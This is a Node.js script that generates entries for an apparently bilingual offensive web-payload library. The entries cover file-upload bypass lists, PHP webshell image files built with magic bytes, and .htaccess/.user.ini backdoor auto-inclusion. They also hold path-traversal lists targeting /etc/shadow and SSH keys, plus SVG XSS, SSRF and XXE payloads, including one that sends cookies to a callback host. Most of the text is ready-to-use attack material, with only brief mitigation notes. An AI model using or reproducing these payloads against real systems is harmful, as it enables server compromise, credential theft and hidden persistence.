import { readFileSync, writeFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';

const filePath = 'src/data/webPayloads.ts';
let content = readFileSync(filePath, 'utf8');
const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');

// ============ HELPERS ============
const i18nObj = (zh, en) => `{ zh: '${zh.replace(/'/g, "\\'").replace(/\n/g, '\\n')}', en: '${en.replace(/'/g, "\\'").replace(/\n/g, '\\n')}' }`;
const makeExecEntry = (titleZh, titleEn, command, descZh, descEn, platform = 'all', breakdown = []) => {
  const parts = breakdown.map(b =>
    `          { part: '${b.part.replace(/'/g, "\\'")}', explanation: ${i18nObj(b.zh, b.en)}, type: '${b.type}' },`
  ).join('\n');
  return `      {
        title: ${i18nObj(titleZh, titleEn)},
        command: \`${command.replace(/`/g, '\\`')}\`,
        description: ${i18nObj(descZh, descEn)},
        platform: '${platform}',
        syntaxBreakdown: [
${parts}
        ]
      },`;
};

// ============ FILE-UPLOAD-BYPASS EXEC ENRICHMENT ============

// Replace exec step 0 (扩展名绕过) with comprehensive list from dict
const extBypassCmd = `# === PHP 扩展名绕过 (完整) ===
# PHP 标准变体:
shell.php  shell.PHP  shell.Php  shell.pHp
shell.php3  shell.php4  shell.php5  shell.php7  shell.php8
shell.phtml  shell.phtm  shell.pht  shell.phar  shell.phps  shell.phpt  shell.pgif
shell.inc  shell.phar  shell.shtml

# 双扩展名:
shell.php.jpg  shell.php.png  shell.php.gif  shell.php.jpeg
shell.jpg.php  shell.png.php  shell.gif.php
shell.php.html  shell.php.txt  shell.php.bmp  shell.php.svg  shell.php.ico
shell.php.css  shell.php.js  shell.php.json  shell.php.xml

# 分号拼接 (IIS/Apache):
shell.php;.jpg  shell.php;.png  shell.php;.txt  shell.php;.html
shell.php;.gif  shell.php;.css  shell.php;.js  shell.php;.svg
shell.asp;.jpg  shell.aspx;.jpg  shell.cer;.jpg  shell.cdx;.jpg
shell.jpg;.aspx  shell.asp;.txt  shell.asa;.jpg  shell.shtml;.jpg

# 空字节截断 (PHP<5.3.4):
shell.php%00.jpg  shell.php%00.png  shell.php%00.gif
shell.php\\x00.jpg  shell.php\\x00.png  shell.php\\x00.gif

# 换行/空格/制表符注入:
shell.php%0a  shell.php%0d  shell.php%0d%0a  shell.php%09.jpg
shell.php%20  shell.php .jpg  shell.php. .jpg

# 末尾特殊字符 (Windows 自动去除):
shell.php.  shell.php..  shell.php...  shell.php.\\  shell.php/  shell.php

# 大小写混写:
shell.pHp  shell.pHP5  shell.PhP  shell.Php3  shell.PHP5

# NTFS ADS (Windows):
shell.php::\\$DATA  shell.php::\\$DATA.jpg  shell.php::\\$DATA.png
shell.php:evil.php  shell.php:evil.txt:\\$DATA

# 双写绕过:
shell.pphphp  shell.pHPhp  shell.phphpp
shell.asaspp  shell.aaspsp  shell.jjspsp  shell.jjspspx

# ASP/ASPX:
shell.asp  shell.aspx  shell.asa  shell.asax  shell.ascx  shell.ashx  shell.asmx
shell.cer  shell.cdx  shell.cshtml  shell.vbhtml  shell.soap  shell.aspx;1.jpg  shell.aspc

# JSP/Java:
shell.jsp  shell.jspx  shell.jsw  shell.jsv  shell.jspf  shell.jtml
shell.jsp;.jpg  shell.jsp;.png  shell.jsp%00.jpg  shell.jsp::\\$DATA
shell.war  shell.ear  shell.jar  shell.class

# 其他服务端扩展:
shell.py  shell.rb  shell.pl  shell.cgi  shell.sh  shell.bash
shell.cfm  shell.cfc  shell.cfml  shell.lua  shell.go  shell.rs
shell.ps1  shell.bat  shell.cmd  shell.vbs  shell.vbe  shell.ws  shell.wsf

# === 编辑器上传路径探测 ===
/kindeditor/attached/file/  /ueditor/php/upload/image/
/ckeditor/upload/  /fckeditor/editor/filemanager/upload/php/
/fckeditor/editor/filemanager/connectors/php/
/wangEditor/upload/  /tinymce/upload/
/ewebeditor/upload/  /xhEditor/upload/`;

const extBypassTitle = { zh: '1. 扩展名绕过（完整版）', en: '1. Extension bypass (complete)' };
const extBypassDesc = { zh: 'PHP/ASP/JSP/其他服务端扩展名变体全覆盖：大小写、双扩展、分号拼接、空字节截断、NTFS ADS、双写、换行/空格注入、编辑器上传路径', en: 'Complete PHP/ASP/JSP/server-side extension variants: case mixing, double extensions, semicolon concatenation, null-byte truncation, NTFS ADS, double-write, newline/space injection, and editor upload paths' };
const extBypassBreakdown = [
  { part: '.phtml .pht .phar', zh: 'PHP 别名扩展', en: 'PHP alias extensions', type: 'value' },
  { part: '.php;.jpg', zh: '分号拼接绕过 (IIS)', en: 'Semicolon concatenation (IIS)', type: 'technique' },
  { part: '%00', zh: '空字节截断字符', en: 'Null-byte truncation character', type: 'encoding' },
  { part: '::$DATA', zh: 'NTFS 备用数据流', en: 'NTFS alternate data stream', type: 'technique' },
  { part: '.pphphp', zh: '双写绕过 (删除后剩余.php)', en: 'Double-write bypass', type: 'technique' },
  { part: '.asp .aspx .jsp', zh: '其他服务端扩展名', en: 'Other server-side extensions', type: 'value' },
  { part: '/kindeditor/', zh: '编辑器上传路径', en: 'Editor upload path', type: 'path' },
];

// Replace exec step 1 (Content-Type) with comprehensive list
const ctCmd = `# === Content-Type 绕过 (完整) ===
# 图片类型:
image/jpeg  image/png  image/gif  image/bmp  image/webp  image/tiff  image/x-icon
image/pjpeg  image/jpg  image/x-png  image/svg+xml

# 通用二进制:
application/octet-stream  application/zip  application/x-rar-compressed
application/x-7z-compressed  application/x-tar  application/gzip

# 文档类型:
application/pdf  application/xml  application/json  application/xhtml+xml
text/plain  text/html  text/xml  text/css

# 脚本类型 (用于探测服务端处理方式):
application/javascript  application/x-javascript  text/javascript
application/x-httpd-php  application/x-php  text/php  text/x-php

# 多媒体 (绕过图片类型限制):
video/mp4  video/avi  video/quicktime  audio/mpeg  audio/wav  audio/ogg

# Content-Disposition 变体:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.p\\x68p"

# 分块传输 (绕过 WAF 流检测):
Transfer-Encoding: chunked`;

// Replace exec step 3 (图片马) with comprehensive version
const imgCmd = `# === 图片马制作 (完整) ===
# Windows copy /b 合成:
copy normal.jpg/b + shell.php/a webshell.jpg
copy normal.png/b + shell.php/a webshell.png

# 魔术字节 + PHP:
GIF89a;<?php system($\_GET["cmd"]); ?>
GIF89a<?php system($\_GET["cmd"]);?>
GIF89a<?php eval($\_POST['cmd']);?>
GIF89a<?php phpinfo();?>
\\x89PNG\\r\\n\\x1a\\n<?php system($\_GET["cmd"]); ?>
\\xff\\xd8\\xff\\xe0<?php system($\_GET["cmd"]); ?>
BM<?php system($\_GET["cmd"]); ?>
%PDF-1.4<?php system($\_GET["cmd"]); ?>

# ExifTool 注入:
exiftool -Comment='<?php system($\_GET["cmd"]); ?>' avatar.png
mv avatar.png avatar.php.png

# SVG 上传 (XSS/SSRF):
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg"><image href="http://169.254.169.254/latest/meta-data/"/></svg>`;

// Replace exec step 4 with .htaccess/.user.ini
const htaccessCmd = `# === .htaccess 上传攻击 ===
# 将 .jpg 映射为 PHP 执行:
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddHandler php5-script .jpg
AddHandler php-script .jpg
SetHandler application/x-httpd-php
<FilesMatch "\\.jpg\\$">
  SetHandler application/x-httpd-php
</FilesMatch>

# === .user.ini 上传 (PHP-FPM) ===
# 自动在每页加载前包含后门:
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg

# 攻击流程:
# 1. 上传 .htaccess (Content-Type: text/plain)
# 2. 上传 shell.jpg (包含 PHP 代码)
# 3. 访问 shell.jpg → Apache 将其作为 PHP 执行

# === Nginx 文件名截断 (CVE-2013-4547) ===
# shell.jpg[0x20][0x0a].php → 截断为 shell.jpg 但作为 PHP 执行`;

// ============ FILE-MIME EXEC ENRICHMENT ============
const mimeStep1Cmd = `# === 探测文件类型检查机制 ===
# 1. 正常图片上传 (建立基线):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"
curl -F "file=@test.png;type=image/png" "http://target.com/upload"
curl -F "file=@test.gif;type=image/gif" "http://target.com/upload"

# 2. PHP 文件 + 伪造 Content-Type (仅检查 MIME 头?):
curl -F "file=@shell.php;type=image/jpeg;filename=test.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=test.png" "http://target.com/upload"
curl -F "file=@shell.php;type=image/gif;filename=test.gif" "http://target.com/upload"
curl -F "file=@shell.php;type=image/bmp;filename=test.bmp" "http://target.com/upload"
curl -F "file=@shell.php;type=image/webp;filename=test.webp" "http://target.com/upload"

# 3. 修改 MIME + 双扩展名:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=shell.php.png" "http://target.com/upload"

# 4. Content-Type 值列表:
# image/jpeg, image/png, image/gif, image/bmp, image/webp,
# image/tiff, image/x-icon, image/svg+xml, image/pjpeg,
# application/octet-stream, application/zip, application/pdf,
# text/plain, text/html, text/xml, video/mp4, audio/mpeg`;

const mimeStep2Cmd = `# === Magic Bytes 伪造 (完整) ===
# GIF89a (最常用):
printf 'GIF89a;' > shell.php && echo '<?php system($\_GET["cmd"]); ?>' >> shell.php

# GIF87a:
printf 'GIF87a;' > shell.jpg.php && echo '<?php system($\_GET["cmd"]); ?>' >> shell.jpg.php

# PNG 文件头:
printf '\\x89PNG\\r\\n\\x1a\\n' > shell.png.php
echo '<?php system($\_GET["cmd"]); ?>' >> shell.png.php

# JPEG 文件头:
printf '\\xff\\xd8\\xff\\xe0' > shell.jpg.php
printf '\\x00\\x10JFIF\\x00' >> shell.jpg.php
echo '<?php system($\_GET["cmd"]); ?>' >> shell.jpg.php

# BMP 文件头:
printf 'BM' > shell.bmp.php && echo '<?php system($\_GET["cmd"]); ?>' >> shell.bmp.php

# PDF 文件头:
printf '%%PDF-1.4' > shell.pdf.php && echo '<?php system($\_GET["cmd"]); ?>' >> shell.pdf.php

# ZIP 文件头 (PK):
printf 'PK\\x03\\x04' > shell.zip.php

# TIFF 文件头:
printf 'II\\x2a\\x00' > shell.tif.php  # Little-endian
printf 'MM\\x00\\x2a' > shell.tif.php  # Big-endian

# RIFF (WebP/AVI):
printf 'RIFF' > shell.webp.php

# GZIP 文件头:
printf '\\x1f\\x8b\\x08' > shell.gz.php

# 7z 文件头:
printf "7z\\xbc\\xaf\\x27\\x1c" > shell.7z.php

# 完整 curl 测试:
curl -F "file=@shell.gif.php;type=image/gif;filename=avatar.gif" "http://target.com/upload"
curl "http://target.com/uploads/avatar.gif?cmd=id"`;

// ============ FILE-TRAVERSAL EXEC ENRICHMENT ============
const traversalCmd = `# === 完整路径遍历 Payload ===
# 基础 ../ 遍历:
../../../../etc/passwd
../../../../etc/shadow
../../../etc/hosts
../../../etc/hostname
../../../../etc/crontab
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../var/log/syslog
../../../../var/log/auth.log
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../proc/version
../../../../proc/cpuinfo
../../../../proc/net/tcp
../../../../root/.bash_history
../../../../root/.ssh/id_rsa
../../../../root/.ssh/authorized_keys

# 编码绕过 (URL编码):
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双重URL编码:
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Unicode/UTF-8 绕过:
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cetc/passwd

# 双写绕过 (....//):
....//....//....//etc/passwd
....\\/....\\/....\\/etc/passwd

# 点号绕过 (..././):
..././..././..././etc/passwd

# 空字节截断 (PHP<5.3.4):
../../../../etc/passwd%00
../../../../etc/passwd%00.php
../../../../etc/passwd%00.jpg

# PHP Wrapper:
php://filter/read=convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../config.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://input
php://filter/convert.base64-encode/resource=/etc/passwd
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data://text/plain,<?php phpinfo();?>
data:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
expect://id
expect://cat%20/etc/passwd
zip://uploads/shell.jpg%23shell.php
phar://uploads/shell.jpg/shell.php
zip://shell.zip%23shell.php
phar://shell.phar/shell.php

# Windows 路径:
C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts
C:\\\\Windows\\\\win.ini
C:\\\\boot.ini
C:\\\\Windows\\\\repair\\\\SAM
C:\\\\Windows\\\\repair\\\\system
C:\\\\inetpub\\\\wwwroot\\\\web.config
c:/windows/system32/drivers/etc/hosts
c:/windows/win.ini
c:/boot.ini

# Windows 反斜杠遍历:
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
..\\..\\..\\windows\\win.ini
..\\..\\..\\boot.ini

# 编码绕过 (反斜杠):
..%5c..%5c..%5cwindows\\win.ini
..%255c..%255c..%255cetc/passwd

# 预定义路径绕过:
./okay/../../../../etc/passwd

# 常见敏感文件路径:
/etc/passwd  /etc/shadow  /etc/hosts  /etc/crontab
/etc/apache2/apache2.conf  /etc/nginx/nginx.conf  /etc/mysql/my.cnf
/var/www/html/index.php  /var/www/html/config.php  /var/www/html/wp-config.php
/var/www/html/configuration.php  /var/www/html/sites/default/settings.php
/var/log/apache2/access.log  /var/log/apache2/error.log
/var/log/nginx/access.log  /var/log/nginx/error.log
/var/log/sshd.log  /var/log/vsftpd.log  /var/log/auth.log
/var/log/httpd/access_log  /var/log/syslog  /var/mail/mail.log
/var/lib/php/sessions/sess_*
/proc/self/fd/0  /proc/self/fd/1  /proc/self/fd/2  /proc/self/fd/[0-50]
/proc/self/environ  /proc/self/cmdline  /proc/version  /proc/cpuinfo
/root/.bash_history  /root/.ssh/id_rsa  /root/.ssh/authorized_keys
/home/*/.bash_history  /home/*/.ssh/id_rsa
WEB-INF/web.xml  /WEB-INF/web.xml  WEB-INF/classes/application.properties

# SSRF 路径 (file://):
file:///etc/passwd  file:///etc/shadow  file:///proc/self/environ
file:///proc/version  file:///var/log/apache2/access.log
file:///var/www/html/index.php  file:///var/www/html/config.php
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/repair/SAM
file:///c:/windows/win.ini`;

// ============ NEW PAYLOADS ============

// --- file-upload-config: .htaccess/.user.ini exploits ---
const newPayloadConfig = {
  id: 'file-upload-config',
  name: { zh: '.htaccess/.user.ini 上传', en: '.htaccess/.user.ini Upload' },
  description: { zh: '上传服务端配置文件(.htaccess/.user.ini)覆盖目录解析规则，将图片映射为脚本执行或自动包含后门', en: 'Upload server configuration files (.htaccess/.user.ini) to override directory parsing rules, mapping images to script execution or auto-including backdoors' },
  category: { zh: '文件漏洞', en: 'File Vulnerabilities' },
  subCategory: { zh: '文件上传', en: 'File Upload' },
  tags: ['upload', 'config', 'htaccess', 'user.ini', 'apache', 'php-fpm'],
  prerequisites: [
    { zh: '目标使用 Apache HTTPD 或 PHP-FPM', en: 'Target uses Apache HTTPD or PHP-FPM' },
    { zh: '上传目录允许覆盖配置文件', en: 'Upload directory allows config file override' },
  ],
  execution: [
    {
      title: { zh: '1. .htaccess AddType 映射', en: '1. .htaccess AddType mapping' },
      command: `# 上传 .htaccess 文件 (Content-Type: text/plain):
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
AddType application/x-httpd-php .bmp

# 或使用 AddHandler:
AddHandler php5-script .jpg
AddHandler php-script .jpg

# 或使用 SetHandler:
SetHandler application/x-httpd-php

# 或用 FilesMatch:
<FilesMatch "\\.jpg\\$">
  SetHandler application/x-httpd-php
</FilesMatch>

# 上传后，再上传 shell.jpg (包含 PHP 代码)
# 访问 shell.jpg → Apache 将其作为 PHP 执行`,
      description: { zh: '通过 AddType/AddHandler/SetHandler 将图片扩展名映射为 PHP 处理器，使后续上传的图片文件被当作 PHP 脚本执行', en: 'Map image extensions to PHP handler via AddType/AddHandler/SetHandler, causing subsequently uploaded images to be executed as PHP scripts' },
      platform: 'linux',
      syntaxBreakdown: [
        { part: 'AddType application/x-httpd-php', zh: 'Apache 指令：将指定扩展名映射到 PHP MIME 类型', en: 'Apache directive: map extension to PHP MIME type', type: 'technique' },
        { part: 'AddHandler', zh: '指定文件处理器', en: 'Specify file handler', type: 'technique' },
        { part: 'SetHandler', zh: '强制所有文件使用指定处理器', en: 'Force all files to use specified handler', type: 'technique' },
      ],
    },
    {
      title: { zh: '2. .user.ini 自动包含', en: '2. .user.ini auto-include' },
      command: `# 上传 .user.ini (PHP-FPM/FastCGI):
auto_prepend_file=shell.jpg
auto_append_file=shell.jpg

# 上传 shell.jpg 包含 PHP 代码
# 此后该目录下所有 PHP 页面加载时自动包含 shell.jpg 中的代码`,
      description: { zh: 'PHP-FPM 环境下通过 .user.ini 的 auto_prepend_file/auto_append_file 指令在每页加载前自动包含后门文件', en: 'Under PHP-FPM, use .user.ini auto_prepend_file/auto_append_file directives to auto-include a backdoor file before every page load' },
      platform: 'linux',
      syntaxBreakdown: [
        { part: 'auto_prepend_file', zh: 'PHP-FPM 指令：在脚本执行前自动包含指定文件', en: 'PHP-FPM directive: auto-include file before script execution', type: 'technique' },
        { part: 'auto_append_file', zh: 'PHP-FPM 指令：在脚本执行后自动包含指定文件', en: 'PHP-FPM directive: auto-include file after script execution', type: 'technique' },
      ],
    },
    {
      title: { zh: '3. Nginx 文件名截断 (CVE-2013-4547)', en: '3. Nginx filename truncation (CVE-2013-4547)' },
      command: `# Nginx 文件名解析漏洞:
# 上传文件名为 shell.jpg[0x20][0x0a].php
# Nginx 在解析时会截断为 shell.jpg，但将其作为 PHP 执行
# 需要 Nginx + PHP-FPM + 特定配置`,
      description: { zh: 'Nginx 文件名解析漏洞——通过在文件名中插入特殊字节截断后缀但保留 PHP 执行能力', en: 'Nginx filename parsing vulnerability — insert special bytes to truncate the extension while retaining PHP execution' },
      platform: 'linux',
      syntaxBreakdown: [
        { part: '[0x20][0x0a]', zh: '空格+换行的 hex 值，触发 Nginx 截断', en: 'Space+newline hex values triggering Nginx truncation', type: 'encoding' },
      ],
    },
    {
      title: { zh: '4. IIS 解析漏洞', en: '4. IIS parsing vulnerabilities' },
      command: `# IIS 6.0 分号截断:
filename="shell.asp;.jpg"

# IIS 7.0+ 解析漏洞:
# 上传 shell.jpg，然后访问:
# http://target.com/uploads/shell.jpg/.php
# (仅在 FastCGI + 特定配置下有效)

# IIS 文件扩展名执行:
shell.asa;.jpg  shell.cer;.jpg  shell.cdx;.jpg`,
      description: { zh: 'IIS 解析特性利用——分号截断和路径解析漏洞', en: 'IIS parser exploitation — semicolon truncation and path parsing vulnerabilities' },
      platform: 'windows',
      syntaxBreakdown: [
        { part: '.asp;.jpg', zh: 'IIS 6.0 分号截断：IIS 将 ; 后的内容忽略', en: 'IIS 6.0 semicolon truncation: IIS ignores content after ;', type: 'technique' },
        { part: '/.php', zh: 'IIS 7.0+ 路径解析：在文件名后追加 /.php 可能触发解析', en: 'IIS 7.0+ path parsing: appending /.php may trigger parsing', type: 'technique' },
      ],
    },
  ],
  attackChain: [
    { title: { zh: '探测服务器类型', en: 'Identify server type' }, description: { zh: '通过响应头和错误页面确认 Web 服务器类型(Apache/Nginx/IIS)和 PHP 运行模式(mod_php/PHP-FPM/FastCGI)。', en: 'Identify the web server type (Apache/Nginx/IIS) and PHP SAPI (mod_php/PHP-FPM/FastCGI) through response headers and error pages.' } },
    { title: { zh: '上传配置文件', en: 'Upload configuration file' }, description: { zh: '根据服务器类型上传对应的配置文件：Apache→.htaccess、PHP-FPM→.user.ini，使用 text/plain Content-Type 绕过类型检查。', en: 'Upload the appropriate config file based on server type: Apache→.htaccess, PHP-FPM→.user.ini, using text/plain Content-Type to bypass type checking.' } },
    { title: { zh: '验证配置生效', en: 'Verify config activation' }, description: { zh: '上传包含 PHP 代码的图片文件，访问该图片检查 PHP 代码是否被解析执行。', en: 'Upload an image file containing PHP code and access it to check whether the code is parsed and executed.' }, payload: 'curl "http://target.com/uploads/test.jpg?cmd=id"' },
    { title: { zh: '持久化与横向移动', en: 'Persistence and lateral movement' }, description: { zh: '利用 auto_prepend_file 建立无文件后门(所有 PHP 页面自动包含)，或修改 .htaccess 实现 URL 重定向和访问控制绕过。', en: 'Establish fileless backdoors via auto_prepend_file (auto-included on every PHP page), or modify .htaccess for URL redirection and access control bypass.' } },
  ],
  analysis: { zh: '配置文件上传是最隐蔽且持久的文件上传攻击——.htaccess 覆盖 Apache 目录级配置使任意图片被当作 PHP 执行，.user.ini 通过 auto_prepend_file 在每页加载前自动包含后门实现无文件攻击。这类攻击不依赖扩展名绕过，配置文件本身就是合法的系统文件，容易被忽视。', en: 'Configuration file upload is the stealthiest and most persistent file upload attack — .htaccess overrides Apache directory config to execute images as PHP, while .user.ini auto-includes backdoors via auto_prepend_file for fileless attacks. These bypass extension checks entirely since config files are legitimate system files and are easily overlooked.' },
  references: [
    'https://httpd.apache.org/docs/current/howto/htaccess.html',
    'https://www.php.net/manual/en/configuration.file.per-user.php',
    'https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html',
  ],
  tutorial: {
    overview: { zh: '.htaccess( Apache)/.user.ini(PHP-FPM)配置文件上传利用技术，通过覆盖目录级配置使非脚本扩展名被当作 PHP 执行，或自动包含后门代码实现持久化。', en: '.htaccess (Apache) / .user.ini (PHP-FPM) configuration file upload exploits override directory-level settings to execute non-script extensions as PHP, or auto-include backdoor code for persistence.' },
    vulnerability: { zh: '文件上传功能通常只校验文件扩展名或内容类型，而 .htaccess/.user.ini 本身没有恶意特征——它们只是纯文本配置文件。如果服务端没有禁止上传隐藏文件或以 .ht 开头的文件，攻击者即可上传。', en: 'File upload features typically only validate file extensions or content types. .htaccess/.user.ini have no malicious signatures — they are just plain-text config files. If the server does not block hidden/dot-files, attackers can upload them.' },
    exploitation: { zh: '先确认服务器类型(Apache/Nginx+IIS)，再上传对应配置文件。Apache 使用 AddType 映射，PHP-FPM 使用 auto_prepend_file 自动包含。上传配置文件后上传包含 PHP 代码的图片，访问验证执行。', en: 'First identify the server type, then upload the corresponding config file. Use AddType mapping for Apache, auto_prepend_file for PHP-FPM. After uploading the config, upload a PHP-injected image and verify execution.' },
    mitigation: { zh: '禁止上传 .htaccess/.user.ini 等隐藏/配置文件；使用 AllowOverride None 禁止目录级配置覆盖；上传目录设置 AllowOverride None；对已上传目录禁用 PHP 解析。', en: 'Block upload of hidden/config files like .htaccess/.user.ini; use AllowOverride None to disable directory-level config overrides; disable PHP execution in upload directories.' },
    difficulty: 'intermediate',
  },
};

// --- file-upload-svg: SVG Upload XSS/SSRF ---
const newPayloadSvg = {
  id: 'file-upload-svg',
  name: { zh: 'SVG 文件上传利用', en: 'SVG File Upload Exploit' },
  description: { zh: '上传包含 XSS 或 SSRF payload 的 SVG 文件，利用 SVG 的脚本执行和外部资源加载能力进行攻击', en: 'Upload SVG files containing XSS or SSRF payloads, leveraging SVG script execution and external resource loading capabilities' },
  category: { zh: '文件漏洞', en: 'File Vulnerabilities' },
  subCategory: { zh: '文件上传', en: 'File Upload' },
  tags: ['upload', 'svg', 'xss', 'ssrf', 'xml'],
  prerequisites: [
    { zh: '目标允许 SVG 文件上传', en: 'Target allows SVG file upload' },
    { zh: '上传的 SVG 可在浏览器中直接访问或嵌入页面', en: 'Uploaded SVG is accessible in browser or embedded in pages' },
  ],
  execution: [
    {
      title: { zh: '1. SVG XSS', en: '1. SVG XSS' },
      command: `<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(1)</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <script>document.location='http://{CALLBACK}/?c='+document.cookie</script>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">

<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="alert(1)" />
  <rect width="100" height="100" />
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg>" />
</svg>`,
      description: { zh: '在 SVG 中嵌入 JavaScript 代码，当 SVG 被浏览器渲染时脚本执行——窃取 Cookie、重定向或执行任意 JS', en: 'Embed JavaScript in SVG; when the SVG is rendered by the browser, the script executes — steal cookies, redirect, or execute arbitrary JS' },
      platform: 'all',
      syntaxBreakdown: [
        { part: '<script>alert(1)</script>', zh: 'SVG 内联脚本（标准 XSS）', en: 'SVG inline script (standard XSS)', type: 'tag' },
        { part: 'onload=', zh: 'SVG 事件处理器', en: 'SVG event handler', type: 'technique' },
        { part: '<use href=', zh: 'SVG use 元素引用外部 SVG 执行', en: 'SVG use element referencing external SVG', type: 'tag' },
      ],
    },
    {
      title: { zh: '2. SVG SSRF', en: '2. SVG SSRF' },
      command: `<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://169.254.169.254/latest/meta-data/"/>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://{CALLBACK}/ssrf-test"/>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://127.0.0.1:8080/admin"/>
</svg>

<svg xmlns="http://www.w3.org/2000/svg">
  <image href="file:///etc/passwd"/>
</svg>`,
      description: { zh: '通过 SVG 的 image/foreignObject 元素发起 SSRF 请求，访问云元数据、内网服务或本地文件', en: 'Initiate SSRF requests through SVG image/foreignObject elements to access cloud metadata, internal services, or local files' },
      platform: 'all',
      syntaxBreakdown: [
        { part: '169.254.169.254', zh: 'AWS 云元数据地址', en: 'AWS cloud metadata endpoint', type: 'domain' },
        { part: '<image href=', zh: 'SVG 图片加载（触发服务端 HTTP 请求）', en: 'SVG image load (triggers server-side HTTP request)', type: 'tag' },
        { part: 'file:///', zh: '本地文件读取', en: 'Local file read', type: 'technique' },
      ],
    },
    {
      title: { zh: '3. SVG XXE', en: '3. SVG XXE' },
      command: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://{CALLBACK}/xxe-test">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>`,
      description: { zh: '利用 SVG 基于 XML 的特性，注入 XXE payload 读取文件或发起外带请求', en: 'Exploit SVG XML foundation to inject XXE payloads for file reading or out-of-band requests' },
      platform: 'all',
      syntaxBreakdown: [
        { part: '<!ENTITY xxe SYSTEM', zh: 'XXE 外部实体声明', en: 'XXE external entity declaration', type: 'technique' },
        { part: '&xxe;', zh: '实体引用——触发文件读取', en: 'Entity reference — triggers file read', type: 'keyword' },
      ],
    },
    {
      title: { zh: '4. SVG 文件包含 + LFI', en: '4. SVG file inclusion + LFI' },
      command: `# 上传 SVG 后通过 LFI 包含执行 PHP 代码:
# PHP 代码嵌入在 SVG 的元数据或注释中:
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <desc>&payload;</desc>
</svg>`,
      description: { zh: '在 SVG 中嵌入 PHP wrapper 或 PHP 代码，结合 LFI 包含上传的 SVG 文件实现代码执行', en: 'Embed PHP wrappers or PHP code in SVG, then include the uploaded SVG file via LFI for code execution' },
      platform: 'linux',
      syntaxBreakdown: [
        { part: 'php://filter/', zh: 'PHP Filter Wrapper', en: 'PHP Filter Wrapper', type: 'value' },
        { part: '<desc>', zh: 'SVG 描述元素（嵌入数据）', en: 'SVG description element', type: 'tag' },
      ],
    },
  ],
  attackChain: [
    { title: { zh: '确认 SVG 上传允许', en: 'Confirm SVG upload allowed' }, description: { zh: '上传正常 SVG 文件测试，确认服务端接受 SVG 且返回可访问 URL。', en: 'Upload a benign SVG to confirm acceptance and accessible URL return.' } },
    { title: { zh: '注入 XSS Payload', en: 'Inject XSS payload' }, description: { zh: '在 SVG 中嵌入 <script> 或 onload 事件，上传后访问验证 JavaScript 是否执行。', en: 'Embed <script> or onload events in SVG; upload and verify JavaScript execution upon access.' }, payload: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">' },
    { title: { zh: '测试 SSRF', en: 'Test SSRF' }, description: { zh: '通过 SVG image 元素引用云元数据或内网地址，确认服务端是否发起请求（需外带确认）。', en: 'Reference cloud metadata or internal addresses via SVG image elements; confirm server-side requests via out-of-band.' } },
    { title: { zh: '结合 LFI 升级 RCE', en: 'Escalate to RCE via LFI' }, description: { zh: '在 SVG 中嵌入 PHP 代码，通过 LFI 包含上传的 SVG 文件执行 PHP 代码。', en: 'Embed PHP code in SVG and include the uploaded file via LFI for PHP code execution.' } },
  ],
  analysis: { zh: 'SVG 是基于 XML 的矢量图格式，支持 JavaScript/事件处理/外部资源加载。上传 SVG 不仅是文件上传问题，更涉及 XSS(脚本执行)、SSRF(服务端请求)和 XXE(XML 实体注入)三重攻击面。很多应用接受 SVG 上传但只做图片类 MIME 校验，忽略了其 XML 和脚本能力。', en: 'SVG is an XML-based vector format supporting JavaScript, event handlers, and external resource loading. SVG upload involves XSS (script execution), SSRF (server-side requests), and XXE (XML entity injection). Many apps accept SVG uploads with only image-type MIME checks, overlooking XML and scripting capabilities.' },
  references: [
    'https://portswigger.net/web-security/file-upload',
